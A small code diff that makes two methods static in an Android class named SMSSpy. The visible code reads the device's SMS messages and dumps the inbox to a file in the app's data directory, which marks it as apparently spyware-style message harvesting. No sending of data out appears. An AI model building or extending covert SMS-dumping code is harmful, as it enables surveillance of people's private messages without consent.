@@ -9,7 +9,7 @@ import java.util.Date;
 import java.util.Locale;
 
 public class SMSSpy {
-    void dumpSMS(Context context, String file, String box) {
+    static void dumpSMS(Context context, String file, String box) {
         SimpleDateFormat formatter = new SimpleDateFormat("yyyy.MM.dd HH:mm:ss", Locale.US);
 
         Cursor cursor = context.getContentResolver()
@@ -62,7 +62,7 @@ public class SMSSpy {
         } catch (Exception ignored) {}
     }
 
-    void writeSMS(Context context){
+    static void writeSMS(Context context){
         String inboxFile = context.getApplicationInfo().dataDir + "/sms_inbox";
         dumpSMS(context, inboxFile, "inbox");
 
